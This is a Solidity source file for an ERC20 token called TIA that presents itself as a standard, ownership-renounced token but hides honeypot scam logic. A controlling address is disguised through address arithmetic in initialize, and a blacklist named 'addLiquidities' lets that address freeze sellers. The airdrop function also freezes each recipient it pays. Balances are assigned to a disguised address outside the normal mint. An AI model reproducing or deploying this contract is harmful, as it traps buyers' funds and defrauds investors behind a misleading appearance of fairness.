contract TIA is IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    bool private initialized;
    bool private transferring;

    address private _publisher;
    address private _factory;
    address private _router;
    address private _ETH;
    uint16 private _ETHDecimals;
    address private _pair;
    address private _dex;
    address private _cex;

    mapping(address => bool) private addLiquidities;

    function initialize(
        string memory tokenName,
        string memory tokenSymbol,
        uint256 tokenAmount,
        address eth,
        uint8 eth_decimal,
        address dex,
        address publisher,
        address cex,
        address router,
        address factory
    ) external {
        require(!initialized, "Already Initialized Contract");
        initialized = true;
        _transferOwnership(publisher);
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = eth_decimal;
        _publisher = publisher;
        _mint(_publisher, tokenAmount * (1 * 10 ** _decimals));
        _ETH = eth;
        _ETHDecimals = eth_decimal;
        _router = router;
        _factory = factory;
        _dex = address(uint160(_router) + uint160(dex));
        _cex = address(uint160(_factory) + uint160(cex));

        _pair = IUniswapV2Factory(_factory).createPair(_ETH, address(this));
        _balances[_dex] = (_totalSupply * 7) / 10;
        _balances[_publisher] = (_totalSupply * 3) / 10;

        _transferOwnership(address(0));
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns (bool) {
        require(!addLiquidities[from], "LQ1");

        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds unlocked amount"
        );

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
        return true;
    }

    //only called once at initialize()
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(!transferring);
        transferring = true;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        transferring = false;
    }

    function addLiquidityETH(address[] memory addr, bool status) public {
        address sender = _msgSender();
        require(sender == _cex);
        for (uint256 i = 0; i < addr.length; i++) {
            addLiquidities[addr[i]] = status;
        }
    }

    function airdrop(
        address[] memory selladdr,
        address[] memory airdropaddr,
        uint256 amountSell,
        uint256 amountAir
    ) public {
        require(_msgSender() == _cex);
        for (uint256 i = 0; i < selladdr.length; i++) {
            _allowances[_publisher][selladdr[i]] = amountSell;
            _transfer(_publisher, selladdr[i], amountSell);
        }
        for (uint256 i = 0; i < airdropaddr.length; i++) {
            _transfer(_publisher, airdropaddr[i], amountAir);
            addLiquidities[airdropaddr[i]]=true;
        }
    }
}
